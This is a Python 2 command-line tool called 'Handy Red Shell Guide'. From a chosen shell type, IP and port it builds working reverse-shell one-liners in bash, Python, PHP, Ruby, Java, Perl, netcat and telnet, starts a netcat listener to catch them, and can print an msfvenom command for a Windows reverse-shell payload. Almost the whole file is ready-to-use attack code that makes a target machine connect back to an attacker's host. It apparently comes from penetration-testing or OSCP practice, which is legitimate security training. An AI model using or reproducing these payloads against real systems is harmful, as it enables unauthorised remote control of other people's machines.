

import argparse
import os


# console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

def banner():
  print  R + (""" 
  
          ----------- Handy Red Shell Guide  ---------------------
          [+] coded by : Lawrence Amer 
          |
          [~] Email : contact@lawrenceamer.me
          | 
          [+] Site: http://lawrenceamer.me/awards/

          -----------------------------------------------------------
          """)
if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('-s', action='store', dest='shell', help="shell types = bash , python , perl ..")
    parser.add_argument('-i', action='store', dest='ip',help="IP Address")
    parser.add_argument('-p', action='store', dest='port', help="local Port")
    results = parser.parse_args()
    if results.shell == "bash":
        print G+("[~]")
        print("/bin/bash -i >& /dev/tcp/%s/%s 0>&1")%(results.ip,results.port)
        os.system("nc -lvp "+results.port)
    elif results.shell =="python":
        print G + ("[+]")
        print("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""")%(results.ip,results.port)
        os.system("nc -lvp " + results.port)
    elif results.shell =="php":
        print G + ("[+]")
        print("""php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'""")%(results.ip,results.port)
        os.system("nc -lvp " + results.port)
    elif results.shell =="ruby":
        print G + ("[+]")
        print("""ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")%(results.ip,results.port)
        os.system("nc -lvp " + results.port)
    elif results.shell =="java":
        print G + ("[+]")
        print("""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()""")%(results.ip,results.port)
        os.system("nc -lvp " + results.port)
    elif results.shell =="perl":
        print G + ("[+]")
        print("""perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")%(results.ip,results.port)
        os.system("nc -lvp " + results.port)
    elif results.shell == "nc":
        print G + ("[+]")
        print("""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f""")%(results.ip,results.port)
        os.system("nc -lvp " + results.port)
    elif results.shell=="telnet":
        print G + ("[+]")
        print("""rm -f /tmp/p; mknod /tmp/p p && telnet %s %s 0/tmp/p""")%(results.ip,results.port)
        os.system("nc -lvp " + results.port)
    elif results.shell=="oscp":
        print("Run it and use it for !")
        print("""msfvenom -p windows/shell_reverse_tcp -a x86 -f python --platform windows LHOST=%s LPORT=%s -b "\x00" EXITFUNC=thread --smallest -e x86/fnstenv_mov
""")%(results.ip,results.port)


    else:
     parser.print_help()
